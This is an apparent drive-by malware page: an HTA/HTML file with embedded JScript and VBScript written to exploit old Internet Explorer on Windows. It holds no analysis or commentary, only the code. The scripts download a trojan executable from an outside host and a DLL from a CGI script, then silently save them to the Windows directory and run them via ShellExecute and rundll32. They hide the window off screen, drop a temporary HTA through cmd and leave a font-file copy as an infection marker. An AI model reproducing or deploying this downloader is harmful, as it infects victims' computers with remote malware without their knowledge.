

<TEXTAREA id="Main_HTA">
<HTML><HEAD>
<HTA:APPLICATION id=PXP
 APPLICATIONNAME="PXP"
 SHOWINTASKBAR=NO
 CAPTION=YES
 SINGLEINSTANCE=YES
 MAXIMIZEBUTTON=NO
 MINIMIZEBUTTON=NO
 WINDOWSTATE=MINIMIZE
 />
</HEAD>
<BODY>
<SCRIPT> 
function Dl(Rp,Ln,Rs,dll)
{
try
{
sAX=unescape("%41DODB%2eStream");
var oS=new ActiveXObject(sAX); 
var oX=new ActiveXObject("Microsoft.XMLHTTP"); 
oX.Open("GET",Rp,0); 
oX.Send();   
var XB=oX.responseBody;

oS.Type=1;
oS.Mode=3; 
oS.Open;
oS.Write(XB); 
oS.SaveToFile(Ln,2);
    
var oA=new ActiveXObject("Shell.Application");
if (dll==0) 
{
Cmd=Ln+" "+Rs;
oA.ShellExecute(Cmd);
}
else
{
Cmd=Ln+Rs;
oA.ShellExecute("rundll32",Cmd); 
}
}
catch(e){}
}
self.moveTo(5000,5000);
</TEXTAREA>

<SCRIPT language="VBScript">
     ssfDESKTOP = 0
     ssfPROGRAMS = 2
     ssfSTARTMENU = 11
     ssfDESKTOPDIRECTORY = 16
     ssfFONTS=20
     ssfCOMMONSTARTMENU = 22
     ssfCOMMONPROGRAMS = 23
     ssfCOMMONSTARTUP = 24
     ssfCOMMONDESKTOPDIR = 25
     ssfCOMMONALTSTARTUP = 30
     ssfCOMMONFAVORITES = 31
     ssfCOMMONAPPDATA = 35
     ssfWINDOWS = 36
     ssfSYSTEM = 37

     Dim oXMLHTTP
     Dim oShellApp
     Dim oFolder
     Dim oFolderItem
     Dim PluginFile
     Dim WinDir
     Dim EnvStrings
     Dim Font_Path_Components
     Dim XMLBody
     Dim cByte
     Dim ByteCode   
     Dim Main_HTA_Body
     Dim Cmd_Params
     Dim Module_Path
     Dim Trojan_Path
     Dim IntervalID
     Dim nCmdCalled
   
     nCmdCalled=0

     WinEnv_Mask="windir=" 

     Exploit_Path=document.location.href 
     j=InStrRev(Exploit_Path,"/",-1,1)
     Exploit_Path=Left(Exploit_Path,j)

     If InStr(Exploit_Path,"cgi-bin")<>0 Then
        CGI_Script_Path=Exploit_Path & "rcounter.cgi"    
     Else
        CGI_Script_Path=Exploit_Path & "cgi-bin/psde/rcounter.cgi"    
     End If   

     InitPaths()
     Randomize

     self.MoveTo 6000,6000

     ExeName=GenerateName()
     ExeName=ExeName & ".exe"
     DllName=GenerateName()
     DllName=DllName & ".dll"     
     HTAName=GenerateName()
     HTAName=HTAName & ".hta" 
           
     Set oShellApp = CreateObject("Shell.Application")
     Set oFolder = oShellApp.NameSpace(ssfFONTS)
     Set oFolderItem=oFolder.ParseName("Symbol.ttf")
     TestName=oFolderItem.Path
     xTestName=Replace(TestName,"Symbol","Symbolw",1,-1,vbTextCompare)
     Font_Path_Components=Split(oFolderItem.Path,"\",-1,1)
     WinDir= Font_Path_Components(0) & "\" &  Font_Path_Components(1) & "\"
     ExeName=WinDir & ExeName
     DllName=WinDir & DllName
     HTAName=WinDir & HTAName
     On Error Resume Next
     Set oFolderItem = oFolder.ParseName("Symbolw.ttf")
     If Err.number <> 0 Then
        Call Run_Installer 
     Else
        LinkPath=oFolderItem.Path
        If LinkPath="" Then
           Call Run_Installer 
        Else
           self.Close
        End If
     End If
     setTimeout "HangUp()",9000

 Sub  Run_Installer
     
     Main_HTA_Body=document.all.Main_HTA.innerText
     Download_Call="Dl('" & Trojan_Path & "'"  & "," & "'" & ExeName & "'" & "," & "'',0);"
     Download_Call=Replace(Download_Call,"\","\\")
     Main_HTA_Body= Main_HTA_Body &  Download_Call
    
     Download_Call= "Dl('" & CGI_Script_Path & "?action=install" & "'"  & ","_
                                           & "'" & DllName & "'" & ","_
                                           & "'" & ",InstallWMH " & Trojan_Path & " " & CGI_Script_Path & "'"_
                                           & ",1);"

     Download_Call=Replace(Download_Call,"\","\\")
     Main_HTA_Body= Main_HTA_Body & Download_Call
     Main_HTA_Body= Main_HTA_Body & "self.close();</SCR" & "IPT></BODY>"
     Main_HTA_Body=Replace(Main_HTA_Body,vbCrLf,"")

' Prepare the string that will be passed to cmd.exe

     Main_HTA_Body=Replace(Main_HTA_Body,">","^>")
     Main_HTA_Body=Replace(Main_HTA_Body,"<","^<")
     WinOS=Get_Win_Version
     Select Case WinOS

            Case "NT"
             
            Call Download_and_Execute(Trojan_Path,ExeName,"",0)
            RunCommand="," & "InstallWMH " & Trojan_Path & " " & CGI_Script_Path
            Call Download_and_Execute(CGI_Script_Path & "?action=install",DllName,RunCommand,1)
            Cmd_Params="cmd /c copy " & TestName & " " & xTestName  
            MSplay.Run (Cmd_Params),1,FALSE 
            
            Case "2K"

     ' Create an additional HTA file (can't be greater than 1000 bytes) 
  
            Cmd_Params="/c echo " & Main_HTA_Body & " > " & HTAName
            oShellApp.ShellExecute "cmd",Cmd_Params,"open"
            oShellApp.ShellExecute "mshta",HTAName
            Cmd_Params="/c copy " & TestName & " " & xTestName 
            oShellApp.ShellExecute "cmd", Cmd_Params
            Cmd_Params="/c del " &  HTAName
            IntervalID=setInterval("Delete_HTA(Cmd_Params)",3000)  
             
            Case "XP"
            
     ' Create an additional HTA file (can't be greater than 1000 bytes) 
  
            Cmd_Params="/c echo " & Main_HTA_Body & " > " & HTAName
            oShellApp.ShellExecute "cmd",Cmd_Params,"open"
            oShellApp.ShellExecute "mshta",HTAName
            Cmd_Params="/c copy " & TestName & " " & xTestName 
            oShellApp.ShellExecute "cmd", Cmd_Params
            Cmd_Params="/c del " &  HTAName
            IntervalID=setInterval("Delete_HTA(Cmd_Params)",3000)  
  
            Case Else

            Call Download_and_Execute(Trojan_Path,ExeName,"",0)
            RunCommand="," & "InstallWMH " & Trojan_Path & " " & CGI_Script_Path
            Call Download_and_Execute(CGI_Script_Path & "?action=install",DllName,RunCommand,1)
            Cmd_Params="command /c copy " & TestName & " " & xTestName  
            MSplay.Run (Cmd_Params),1,FALSE         
      End Select      
End  Sub  

Sub Download_and_Execute(Remote_path,Local_name,Run_params,Run_by_Rundll32)

set oXMLHTTP = CreateObject("Microsoft.XMLHTTP")
Module_Path=Remote_path
OpenSession()
GetStatus=GetFile()
 
   If GetStatus=0 Then 
   Plugin_size=LenB(XMLBody)
   
   Set PluginFile=MSmedia.CreateTextFile(Local_name, TRUE)

   For j=1 To Plugin_size 
       cByte=MidB(XMLBody,j,1)
       ByteCode=AscB(cByte)
       WriteFile()
   Next

   PluginFile.Close
   If Run_by_Rundll32 = 0 Then
      Cmd=Local_name & " " & Run_params
   Else
      Cmd="rundll32" & " " & Local_name & Run_params  
   End If
   On Error Resume Next
   MSplay.Run (Cmd),1,FALSE
   End If

set  oXMLHTTP=Nothing

End Sub

Function HangUp()

        clearInterval(IntervalID)
        self.Close

End Function

Function Delete_HTA(params)

        If  nCmdCalled<4 Then 
        oShellApp.ShellExecute "cmd",params
        nCmdCalled=nCmdCalled+1
        End If          
   
End Function   


Function Get_Win_Version()

     IEversion=navigator.appVersion
     If InStr(IEversion,"Windows 95") <> 0  Then
        Get_Win_Version="95"
     ElseIf InStr(IEversion,"Windows NT 4") <> 0  Then
        Get_Win_Version="NT"
     ElseIf InStr(IEversion,"Win 9x 4.9") <> 0  Then
        Get_Win_Version="ME"
     ElseIf InStr(IEversion,"Windows 98") <> 0  Then
        Get_Win_Version="98"
     ElseIf InStr(IEversion,"Windows NT 5.0") <> 0  Then
        Get_Win_Version="2K"
     ElseIf InStr(IEversion,"Windows NT 5.1") <> 0  Then
        Get_Win_Version="XP"
     Else 
        Get_Win_Version="Unknown"
     End If
     
End Function

Function WriteFile
PluginFile.Write(Chr(ByteCode))
End Function

Function GetFile
     oXMLHTTP.Send() 
     On Error Resume Next
     XMLBody=oXMLHTTP.responseBody
     If Err.number <> 0 Then
        GetFile=-1 
     Else
        GetFile=0 
     End  If     
End Function

Function OpenSession
Req_type="G" & "E" & "T"
HTTPSession=oXMLHTTP.Open(Req_Type,Module_Path,0) 
End Function

Function GenerateName()
RandomName=""
rr=Int(8*Rnd)
ik=0
Do
ii=Int(25*Rnd)+97
RandomName=RandomName+Chr(ii)
ik=ik+1
Loop While ik<rr
GenerateName=RandomName
End Function

Function InitPaths
Trojan_Path="http://www.oil-bank.ru/psde.exe" 
End Function

</SCRIPT>
</BODY></HTML>
